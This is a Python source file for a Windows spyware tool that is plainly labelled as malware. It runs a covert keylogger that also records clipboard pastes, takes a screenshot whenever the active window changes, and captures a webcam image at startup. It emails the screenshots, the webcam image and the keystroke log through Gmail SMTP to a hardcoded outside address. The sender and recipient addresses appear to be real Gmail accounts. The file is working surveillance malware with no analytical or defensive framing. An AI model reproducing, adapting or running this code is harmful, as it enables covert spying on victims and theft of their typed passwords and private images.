from ctypes import *
from cv2 import *
import numpy
import pythoncom
import pyHook
import win32clipboard
import os
import _winreg
import win32gui,win32ui,win32con,win32api
import time
import getpass
import atexit
import socket
import re
import smtplib
from threading import Thread
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from os.path import basename
username    = getpass.getuser()
user32      = windll.user32
kernel32    = windll.kernel32
psapi       = windll.psapi
current_window = None
file = open("windows_system_log.txt", "w")
liste = []
mail = "utkucolak05@gmail.com"
passwd = ""
s_to = "kolon01fantastik@gmail.com"
subject = "malware"
mssage = getpass.getuser()
class Mail (object):
	def __init__ (self, mail, passwd, s_to, subject, mssage, doc=None):
		(self.mail, self.passwd, self.s_to, self.subject, self.mssage, self.doc) = (mail, passwd, s_to, subject, mssage, doc)	
		self.base = lambda x: os.path.basename (x)
		self.host = "smtp.gmail.com"
		self.port = 465
		pass

	def __call__ (self):
		msg = self.create_msg (self.s_to, self.subject, self.mssage, self.doc)
		self.send (msg)
		return (True)

	def create_msg (self, s_to, m_subject, m_message, a_file=None):
		
		msg = MIMEMultipart ()
		(msg ['From'], msg ['To'], msg ['Subject'], msg ['Date']) = \
		(self.mail, s_to, m_subject, formatdate (localtime=True))

		if (a_file):
			with open (a_file, "r+") as doc:
				base	= self.base (a_file)
				attachm = MIMEApplication (doc.read (), Name=base)
				attachm ['Content-Disposition'] = 'attachment; filename="{0}"'.format (str(base))
				msg.attach (attachm)
				

		msg.attach (MIMEText (m_message))
		
		return (msg)

	def send (self, msg):
		
		smtpd = smtplib.SMTP_SSL (self.host, self.port)
		smtpd.ehlo ()
		smtpd.login (self.mail, self.passwd)
		
		smtpd.sendmail (self.mail, self.s_to, msg.as_string ())
		
		smtpd.close ()
		
		return (True)
class ScreenShot(object):
    def __init__(self):
        self.hdesktop = win32gui.GetDesktopWindow()
        self.width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        self.height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        self.left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        self.top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
        self.desktop_dc = win32gui.GetWindowDC(self.hdesktop)
        self.img_dc = win32ui.CreateDCFromHandle(self.desktop_dc)
        self.mem_dc = self.img_dc.CreateCompatibleDC()
        self.screenshot = win32ui.CreateBitmap()
        
    def screen_shot(self):
        self.zaman = time.strftime("%c")
        self.zaman = self.zaman.replace(":", ".")
        self.zaman = self.zaman.replace("/", ".")
        self.screenshot.CreateCompatibleBitmap(self.img_dc, self.width, self.height)
        self.mem_dc.SelectObject(self.screenshot)
        self.mem_dc.BitBlt((0,0), (self.width, self.height), self.img_dc, (self.left, self.top), win32con.SRCCOPY)
        self.name = "{}.bmp".format(self.zaman)
        self.x = self.screenshot.SaveBitmapFile(self.mem_dc, self.name)
        time.sleep(2)
        Mail(mail, passwd, s_to, subject, mssage, os.path.abspath(self.name))()
        self.mem_dc.DeleteDC()
        win32gui.DeleteObject(self.screenshot.GetHandle())
class Keylogging(object):
    def __init__(self, file):
        self.file = file
        pass

    
    def get_process(self):
        self.hwnd = user32.GetForegroundWindow()
        self.pid = c_ulong(0)
        user32.GetWindowThreadProcessId(self.hwnd, self.pid)
        self.process_id = "%d" % self.pid.value
        self.exe = create_string_buffer("\x00" * 512)
        self.h_process = kernel32.OpenProcess(0x400 | 0x10, False, self.pid)
        psapi.GetModuleBaseNameA(self.h_process, None, byref(self.exe), 512)
        self.win_title = create_string_buffer("\x00" * 512)
        self.length = user32.GetWindowTextA(self.hwnd, byref(self.win_title), 512)
        print >> self.file, "[*]PID: %s - %s - %s" %(self.process_id, self.exe.value, self.win_title.value)
        basla = ScreenShot()
        basla.screen_shot()
        kernel32.CloseHandle(self.hwnd)
        kernel32.CloseHandle(self.h_process)
    def Keylog(self, event):
        global current_window
        if event.WindowName != current_window:
            current_window = event.WindowName
            self.get_process()

        if event.Ascii > 32 and event.Ascii < 127:
            print >> self.file, chr(event.Ascii),           
        else:
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                self.pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print >> self.file, "[PASTED] - %s" % (self.pasted_value)
                
            else:
                print >> self.file, "[%s]" % event.Key,
        self.file.flush ()
        os.fsync (self.file.fileno ())
        return True
class webCam(object):
        def __init__(self):
                self.cam = VideoCapture(0)
                s, self.img = self.cam.read()
        def take(self):
                
                imwrite("filename.jpg",self.img)
                self.path = os.path.abspath("filename.jpg")
                Mail(mail, passwd, s_to, subject, mssage, self.path)()
def log_info(msg):
    """ Prints """
    print msg
    f = open("loggg.txt", "a")
    f.write(msg + "\n")
    f.close()
def wndproc(hwnd, msg, wparam, lparam):
    Mail(mail, passwd, s_to, subject, mssage, os.path.abspath("windows_system_log.txt"))()
webcam = webCam()
webcam.take()
def t1():
        kl = pyHook.HookManager()
        kl.KeyDown = Keylogging(file).Keylog
        kl.HookKeyboard()
        pythoncom.PumpMessages()
def t2():
        hinst = win32api.GetModuleHandle(None)
        wndclass = win32gui.WNDCLASS()
        wndclass.hInstance = hinst
        wndclass.lpszClassName = "testWindowClass"
        messageMap = {win32con.WM_ENDSESSION : wndproc,
                           win32con.WM_QUERYENDSESSION : wndproc}

        wndclass.lpfnWndProc = messageMap

        try:
        
                myWindowClass = win32gui.RegisterClass(wndclass)
                hwnd = win32gui.CreateWindowEx(win32con.WS_EX_LEFT,
                                       
                                             myWindowClass, 
                                             "testMsgWindow", 
                                             0, 
                                             0, 
                                             0, 
                                             win32con.CW_USEDEFAULT, 
                                             win32con.CW_USEDEFAULT, 
                                             0, 
                                             0, 
                                             hinst, 
                                             None)
        except Exception, e:
        
                log_info("Exception: %s" % str(e))


        if hwnd is None:
        
                log_info("hwnd is none!")
        else:
                log_info("hwnd: %s" % hwnd)
        

        while True:
                win32gui.PumpWaitingMessages()
                time.sleep(1)
Thread(target=t1).start()
Thread(target=t2).start()

    

    
